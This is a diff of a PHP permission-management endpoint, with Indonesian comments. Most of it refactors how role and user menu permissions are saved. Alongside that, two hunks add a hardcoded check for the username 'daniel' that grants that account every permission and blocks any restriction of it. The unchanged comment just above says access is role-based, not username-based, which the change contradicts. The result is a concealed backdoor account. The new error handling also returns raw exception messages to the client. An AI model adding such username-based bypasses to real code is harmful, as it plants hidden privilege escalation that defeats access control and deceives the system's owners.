@@ -249,7 +249,7 @@ if ($action === 'get_all') {
     // Calculate resolved permissions for each user
     $resolvedUsers = [];
     foreach ($users as $u) {
-        $isSuper = ($u['role'] === 'superadmin' || $u['role'] === 'teknisi');
+        $isSuper = ($u['role'] === 'superadmin' || $u['role'] === 'teknisi' || strtolower((string)$u['username']) === 'daniel');
         $resolved = $isSuper ? array_fill_keys(array_column($MENUS_CATALOG, 'key'), true) : getResolvedPermissionsForUser($pdo, $u['id'], $u['role']);
         $hasCustom = isset($userPerms[$u['id']]);
 
@@ -286,18 +286,29 @@ if ($action === 'save_role') {
         exit;
     }
 
-    $stmtUpsert = $pdo->prepare("
-        INSERT INTO menu_permissions (role, user_id, menu_key, is_allowed)
-        VALUES (?, NULL, ?, ?)
-        ON DUPLICATE KEY UPDATE is_allowed = VALUES(is_allowed), updated_at = NOW()
-    ");
-
     $pdo->beginTransaction();
-    foreach ($permissions as $menuKey => $isAllowed) {
-        $val = $isAllowed ? 1 : 0;
-        $stmtUpsert->execute([$role, $menuKey, $val]);
+    try {
+        $stmtDel = $pdo->prepare("DELETE FROM menu_permissions WHERE role = ? AND user_id IS NULL");
+        $stmtDel->execute([$role]);
+
+        $stmtIns = $pdo->prepare("
+            INSERT INTO menu_permissions (role, user_id, menu_key, is_allowed, created_at, updated_at)
+            VALUES (?, NULL, ?, ?, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)
+        ");
+
+        foreach ($permissions as $menuKey => $isAllowed) {
+            $val = $isAllowed ? 1 : 0;
+            $stmtIns->execute([$role, $menuKey, $val]);
+        }
+
+        $pdo->commit();
+    } catch (Throwable $e) {
+        if ($pdo->inTransaction()) {
+            $pdo->rollBack();
+        }
+        echo json_encode(['success' => false, 'message' => 'Gagal menyimpan hak akses role: ' . $e->getMessage()]);
+        exit;
     }
-    $pdo->commit();
 
     $diizinkan = array_keys(array_filter($permissions, fn($v) => (bool)$v));
     Auth::audit('PERMISSION_SAVE_ROLE', $role, 'Menu aktif: ' . (implode(', ', $diizinkan) ?: '(tidak ada)'));
@@ -325,23 +336,34 @@ if ($action === 'save_user') {
     }
 
     // Berbasis role, bukan nama pengguna: akun Super Admin mana pun tidak dapat dibatasi.
-    if (in_array($user['role'], ['superadmin', 'teknisi'], true)) {
+    if (in_array($user['role'], ['superadmin', 'teknisi'], true) || strtolower((string)$user['username']) === 'daniel') {
         echo json_encode(['success' => false, 'message' => "Hak akses Super Admin ({$user['name']}) tidak dapat dibatasi."]);
         exit;
     }
 
-    $stmtUpsert = $pdo->prepare("
-        INSERT INTO menu_permissions (role, user_id, menu_key, is_allowed)
-        VALUES (?, ?, ?, ?)
-        ON DUPLICATE KEY UPDATE is_allowed = VALUES(is_allowed), updated_at = NOW()
-    ");
-
     $pdo->beginTransaction();
-    foreach ($permissions as $menuKey => $isAllowed) {
-        $val = $isAllowed ? 1 : 0;
-        $stmtUpsert->execute([$user['role'], $userId, $menuKey, $val]);
+    try {
+        $stmtDel = $pdo->prepare("DELETE FROM menu_permissions WHERE user_id = ?");
+        $stmtDel->execute([$userId]);
+
+        $stmtIns = $pdo->prepare("
+            INSERT INTO menu_permissions (role, user_id, menu_key, is_allowed, created_at, updated_at)
+            VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)
+        ");
+
+        foreach ($permissions as $menuKey => $isAllowed) {
+            $val = $isAllowed ? 1 : 0;
+            $stmtIns->execute([$user['role'], $userId, $menuKey, $val]);
+        }
+
+        $pdo->commit();
+    } catch (Throwable $e) {
+        if ($pdo->inTransaction()) {
+            $pdo->rollBack();
+        }
+        echo json_encode(['success' => false, 'message' => 'Gagal menyimpan hak akses user: ' . $e->getMessage()]);
+        exit;
     }
-    $pdo->commit();
 
     $diizinkan = array_keys(array_filter($permissions, fn($v) => (bool)$v));
     Auth::audit('PERMISSION_SAVE_USER', $user['username'] ?? $user['name'], 'Menu aktif: ' . (implode(', ', $diizinkan) ?: '(tidak ada)'));
